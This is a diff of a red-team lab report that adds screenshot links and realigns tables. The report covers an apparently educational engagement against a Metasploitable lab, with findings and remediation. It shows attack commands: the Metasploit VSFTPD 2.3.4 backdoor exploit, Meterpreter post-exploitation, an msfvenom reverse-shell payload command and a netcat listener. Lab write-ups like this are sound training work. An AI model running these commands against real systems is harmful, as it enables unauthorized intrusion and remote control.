@@ -43,6 +43,9 @@ set LHOST 192.168.30.130
 set LPORT 4444
 run
 ```
+
+![C2 Handler Setup](screenshots/Screenshot_2026-04-10_12-28-07.png)
+
 **Session Log:**
 
 | Session ID | Target IP       | Payload Type        | Notes              |
@@ -59,10 +62,13 @@ run
 ```bash
 nmap 192.168.30.129
 ```
+
+![Nmap Reconnaissance](screenshots/Screenshot_2026-04-10_12-33-33.png)
+
 **Findings:**
 
-| Phase | Tool | Action    | Result                              |
-|-------|------|-----------|-------------------------------------|
+| Phase | Tool | Action    | Result                               |
+|-------|------|-----------|--------------------------------------|
 | Recon | Nmap | Port Scan | FTP, MySQL, VNC and other ports open |
 
 **Summary:** Nmap port scanning was performed against the target to identify open services and potential attack surfaces. Discovered services including FTP (VSFTPD), MySQL, and VNC guided exploitation planning in subsequent phases of the engagement.
@@ -78,11 +84,14 @@ set RHOSTS 192.168.30.129
 set LHOST 192.168.30.130
 run
 ```
+
+![VSFTPD Exploitation](screenshots/Screenshot_2026-04-10_12-43-24.png)
+
 **Finding:**
 
-| Finding ID | TTP             | CVSS Score | Vulnerability         | Remediation           |
-|------------|-----------------|------------|----------------------|-----------------------|
-| FID001     | T1190 (Exploit) | 9.8        | VSFTPD 2.3.4 Backdoor | Patch / upgrade VSFTPD |
+| Finding ID | TTP             | CVSS Score | Vulnerability          | Remediation            |
+|------------|-----------------|------------|------------------------|------------------------|
+| FID001     | T1190 (Exploit) | 9.8        | VSFTPD 2.3.4 Backdoor  | Patch / upgrade VSFTPD |
 
 **Summary:** The known VSFTPD 2.3.4 backdoor vulnerability was exploited using Metasploit, granting unauthorized shell access to the target. This demonstrates how unpatched legacy services provide trivial entry points for attackers during real-world engagements.
 
@@ -95,6 +104,9 @@ getuid
 pwd
 sysinfo
 ```
+
+![Meterpreter Session](screenshots/Screenshot_2026-04-10_12-44-15.png)
+
 **Summary:** A Meterpreter session was established after successful exploitation, confirming root-level access. Post-exploitation activities verified user privileges and gathered system information, simulating attacker behavior during the persistence and discovery phases of the attack lifecycle.
 
 ---
@@ -104,11 +116,14 @@ sysinfo
 ```bash
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.30.130 LPORT=4444 -f elf > shell.elf
 ```
+
+![Payload Creation](screenshots/Screenshot_2026-04-10_12-47-58.png)
+
 **Payload Log:**
 
-| Payload ID | Type                    | AV Detection | Notes                   |
-|------------|-------------------------|--------------|-------------------------|
-| PID001     | Linux Meterpreter Rev TCP | Tested     | ELF binary generated    |
+| Payload ID | Type                      | AV Detection | Notes                |
+|------------|---------------------------|--------------|----------------------|
+| PID001     | Linux Meterpreter Rev TCP | Tested       | ELF binary generated |
 
 **Summary:** A reverse shell ELF payload was generated using msfvenom targeting a Linux x86 system. Payload generation is a core evasion and persistence technique, enabling attackers to deliver and execute custom implants tailored to the target environment.
 
@@ -119,6 +134,11 @@ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.30.130 LPORT=4444 -f
 ```bash
 nc -lvnp 4444
 ```
+
+![Netcat Listener](screenshots/Screenshot_2026-04-10_12-49-04.png)
+
+![Netcat Shell](screenshots/Screenshot_2026-04-10_12-56-22.png)
+
 **Summary:** A Netcat listener was established to receive a reverse shell from the target system. This simulates real-world scenarios where attackers maintain access post-exploitation using lightweight, native tools that are less likely to trigger AV or IDS detections.
 
 ---
@@ -129,10 +149,13 @@ nc -lvnp 4444
 ```bash
 aws --version
 ```
+
+![AWS CLI](screenshots/Screenshot_2026-04-10_12-38-21.png)
+
 **Asset Log:**
 
-| Asset ID | Service | Misconfiguration    | Notes                      |
-|----------|---------|---------------------|----------------------------|
+| Asset ID | Service | Misconfiguration    | Notes                       |
+|----------|---------|---------------------|-----------------------------|
 | AID001   | S3      | Public read access  | Simulated vulnerable bucket |
 | AID002   | IAM     | Overprivileged role | Simulated privilege escalation |
 
@@ -144,11 +167,11 @@ aws --version
 **Tools:** Caldera / Metasploit  
 **Orchestration Log:**
 
-| Phase       | TTP   | Tool Used  | Notes                   |
-|-------------|-------|------------|-------------------------|
-| Recon       | T1580 | Pacu       | S3 bucket enumeration   |
-| Exploitation| T1190 | Metasploit | Remote code execution   |
-| Persistence | T1071 | Meterpreter| C2 session established  |
+| Phase        | TTP   | Tool Used  | Notes                  |
+|--------------|-------|------------|------------------------|
+| Recon        | T1580 | Pacu       | S3 bucket enumeration  |
+| Exploitation | T1190 | Metasploit | Remote code execution  |
+| Persistence  | T1071 | Meterpreter| C2 session established |
 
 **Summary:** A multi-stage attack simulation was performed automating the full chain from reconnaissance through exploitation to C2 establishment. Automated attack orchestration demonstrates how modern threat actors chain techniques efficiently to reduce dwell time and increase impact.
 
@@ -157,14 +180,16 @@ aws --version
 ### 9. Capstone Project — Full Adversary Simulation
 **Phases:** Recon → Exploit → Shell → C2 Control
 
+![Capstone - Full Compromise](screenshots/Screenshot_2026-04-10_12-44-15.png)
+
 **Campaign Log:**
 
-| Phase       | Tool Used  | Action Description         | MITRE Technique |
-|-------------|------------|----------------------------|-----------------|
-| Recon       | Nmap       | Port and service scan       | T1046           |
-| Exploitation| Metasploit | VSFTPD backdoor exploit     | T1190           |
-| Shell       | Netcat     | Reverse shell established  | T1059           |
-| C2 Control  | Meterpreter| Session managed, sysinfo   | T1071           |
+| Phase        | Tool Used   | Action Description          | MITRE Technique |
+|--------------|-------------|-----------------------------|-----------------|
+| Recon        | Nmap        | Port and service scan        | T1046           |
+| Exploitation | Metasploit  | VSFTPD backdoor exploit      | T1190           |
+| Shell        | Netcat      | Reverse shell established   | T1059           |
+| C2 Control   | Meterpreter | Session managed, sysinfo    | T1071           |
 
 **Summary:** A complete red team attack lifecycle was executed against a Metasploitable lab environment, covering scanning, exploitation, payload delivery, and remote shell access. This capstone demonstrates practical proficiency in offensive security techniques and the full adversary simulation process.
 
@@ -172,13 +197,13 @@ aws --version
 
 ## 📊 Lab Logs
 
-| Phase   | Tool       | Action            | Result                    |
-|---------|------------|-------------------|---------------------------|
-| Recon   | Nmap       | Port scan         | Open ports found          |
-| Exploit | Metasploit | VSFTPD exploit    | Root access gained        |
-| Shell   | Netcat     | Reverse shell     | Connection established    |
-| C2      | Meterpreter| Session control   | Post-exploitation done    |
-| Cloud   | AWS CLI    | S3/IAM enum       | Misconfigurations found   |
+| Phase   | Tool        | Action            | Result                  |
+|---------|-------------|-------------------|-------------------------|
+| Recon   | Nmap        | Port scan         | Open ports found        |
+| Exploit | Metasploit  | VSFTPD exploit    | Root access gained      |
+| Shell   | Netcat      | Reverse shell     | Connection established  |
+| C2      | Meterpreter | Session control   | Post-exploitation done  |
+| Cloud   | AWS CLI     | S3/IAM enum       | Misconfigurations found |
 
 ---
 
@@ -189,11 +214,11 @@ This week's red team engagement against a lab environment (Metasploitable) succe
 
 **Key Findings:**
 
-| Finding ID | TTP                    | CVSS Score | Remediation               |
-|------------|------------------------|------------|---------------------------|
-| FID001     | T1190 – VSFTPD Backdoor | 9.8       | Patch / replace VSFTPD    |
-| FID002     | T1580 – Cloud Recon    | 7.5        | Restrict S3 bucket access |
-| FID003     | T1078.004 – IAM Abuse  | 8.1        | Enforce least privilege   |
+| Finding ID | TTP                     | CVSS Score | Remediation               |
+|------------|-------------------------|------------|---------------------------|
+| FID001     | T1190 – VSFTPD Backdoor | 9.8        | Patch / replace VSFTPD    |
+| FID002     | T1580 – Cloud Recon     | 7.5        | Restrict S3 bucket access |
+| FID003     | T1078.004 – IAM Abuse   | 8.1        | Enforce least privilege   |
 
 **Recommendations:** Patch legacy services, enforce MFA, apply least-privilege IAM policies, and implement network segmentation to limit lateral movement.
 
